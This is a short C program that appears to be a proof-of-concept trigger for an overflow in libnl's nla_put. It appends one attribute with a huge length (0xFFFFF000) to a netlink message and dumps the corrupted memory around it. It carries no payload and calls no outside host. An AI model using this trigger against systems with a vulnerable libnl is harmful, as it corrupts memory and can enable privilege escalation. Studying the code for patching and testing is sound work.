#include <netlink-local.h>
#include <netlink/netlink.h>
#include <netlink/msg.h>
#include <stdio.h>

void dump_memory( char *data, unsigned long data_length )
{
	unsigned long i = 0;
	for ( ; i< data_length; i++ ) {
		if ( i%32== 0 ) {
			printf( "\n%08lx : ", (unsigned long)data+i );
		}
		else if ( i%8 == 0 ) {
			printf( "  " );
		}

		printf( "%02x ", data[i] );	
	}
	printf( "\n" );
}

int main( int argc, char **argv )
{
	struct nl_msg *message = NULL;
	message = nlmsg_alloc();
	if ( message == NULL ) {
		printf( "Alloc message memory failed\n" );
		return -1;
	}

	printf( "[+] nl_msg.nm_size : %zx\n", message->nm_size );

	struct nlmsghdr * hdr;
	hdr = message->nm_nlh;

	int length = 0x1000+12- 0x30;
	char *pad = malloc( length );
	if ( pad == NULL ) return -1;
	memset( pad, 0x41, length );

	char *pad2 = malloc( 0x1000);
	if ( pad2 == NULL ) return -1;
	memset( pad2, 0x33, 0x1000);

	nla_put( message, 0x4444, length, pad );
	char *data = (char *)hdr;
	dump_memory( data, message->nm_size + 0x100 );

	nla_put( message, 0x8888, 0xFFFFF000, pad2 );
	dump_memory( data, message->nm_size + 0x100 );

	printf( "[+] message address [%p, %p]\n", hdr, nlmsg_tail( hdr ) );
	printf( "[+] message len = 0x%x\n", message->nm_nlh->nlmsg_len );


	return 0;
}
